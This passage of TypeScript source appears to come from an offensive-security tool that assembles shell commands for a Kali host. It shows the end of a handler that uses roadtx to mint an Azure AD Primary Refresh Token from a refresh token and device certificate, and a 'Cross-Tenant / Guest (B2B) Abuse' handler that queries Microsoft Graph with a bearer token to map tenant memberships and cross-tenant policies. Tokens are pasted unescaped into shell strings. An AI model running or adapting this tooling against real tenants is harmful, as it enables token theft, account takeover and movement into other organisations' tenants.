      `test -d ${PS_DIR}/AADInternals && echo "AADInternals: PRESENT" || echo "AADInternals: NOT PRESENT (${PS_DIR}/AADInternals)"`,
      `echo ""`,
    ];

    if (!attempt_prt) {
      commands.push(`echo "--- DRY-RUN (attempt_prt=false): no PRT derivation attempted ---"`);
      commands.push(`echo "PRT derivation needs a registered-device context (cert) and is partly Windows-host-bound."`);
      commands.push(`echo "Set attempt_prt=true with a device_cert to attempt roadtx PRT mint (user-confirm required); local-DPAPI extraction is documented PARTIAL on Linux."`);
    } else if (device_cert && refresh_token) {
      commands.push(`echo "--- roadtx PRT request ---"`);
      commands.push(
        `roadtx prt --refresh-token '${refresh_token}' --cert-pfx '${device_cert}' --tenant ${tenant_id} 2>&1 || echo "roadtx PRT request FAILED (see stderr above; likely missing device context — mark PARTIAL)"`
      );
    } else {
      commands.push(`echo "attempt_prt=true but missing device_cert and/or refresh_token — PRT derivation requires both. Marking PARTIAL."`);
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== PRT Derivation/Abuse Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  test_cross_tenant: async (args: {
    tenant_id: string;
    access_token: string;
    foreign_tenant_id?: string;
  }) => {
    const { tenant_id, access_token, foreign_tenant_id } = args;

    const commands: string[] = [
      `echo "=== Cross-Tenant / Guest (B2B) Abuse ==="`,
      `echo "Home tenant: ${tenant_id}"`,
      `echo "Foreign tenant: ${foreign_tenant_id || "(enumerate reachable tenants)"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
      `echo "--- Tenants reachable from this identity (read-only) ---"`,
      `curl -sS -H "Authorization: Bearer ${access_token}" "https://graph.microsoft.com/v1.0/me/memberOf" 2>&1 | head -c 15000 || echo "memberOf request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Cross-tenant access settings ---"`,
      `curl -sS -H "Authorization: Bearer ${access_token}" "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/partners" 2>&1 | head -c 15000 || echo "crossTenantAccessPolicy request FAILED (see stderr above)"`,
      `echo ""`,
    ];

    if (foreign_tenant_id) {
      commands.push(`echo "--- Probing foreign tenant ${foreign_tenant_id} resources (read-only) ---"`);
      commands.push(
        `curl -sS -H "Authorization: Bearer ${access_token}" "https://graph.microsoft.com/v1.0/organization" 2>&1 | head -c 8000 || echo "Foreign tenant probe FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
    }

    commands.push(`echo "=== Cross-Tenant Abuse Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },
};
